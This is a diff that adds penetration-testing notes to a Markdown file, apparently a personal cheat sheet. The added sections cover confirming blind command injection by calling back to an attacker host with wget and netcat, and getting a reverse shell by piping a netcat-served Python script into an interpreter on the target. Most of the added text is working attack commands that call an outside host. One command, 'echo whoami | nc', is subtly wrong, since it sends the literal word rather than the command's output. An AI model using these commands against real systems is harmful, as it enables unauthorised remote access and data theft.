@@ -40,3 +40,53 @@ or:
  return /a/;
 })();
 ```
+
+
+## Gaining sight from blind command injection attacks
+
+Tricks for verifying that a command actually goes through when doing blind command injection.
+You can try:
+
+```
+wget ${ATTACKER_IP}
+```
+if that hits your IP, you are good.
+
+You can also get a result from the command you run with e.g.:
+
+
+```
+echo whoami | nc ${ATTACKER_IP} ${ATTACKER_PORT}
+```
+And you should get the result on your nc listener on the port.
+Note that this can also be used for checking bad special characters.
+
+
+## exposing reverse shells with nc
+
+Assume we have a linux box vulnerable to a command injection attack through a web server or something along those lines.
+We can expose a reverse shell in the following way, if we so choose.
+
+we pick a shell, e.g. python and place the python script in shell.py, and point it to `$ATTACKER_IP` and port 443.
+
+Now on the attack box we run:
+
+
+```
+nc -nvlp 8080 < shell.py
+```
+
+and another listener on
+
+```
+nc -nvlp 443
+```
+
+Now, if we inject the command:
+```
+nc $ATTACKER_IP 8080 | python
+```
+
+We get a shell on the last listener we opened.
+This can help us avoid having to send special characters over the wire to the target boxes.
+
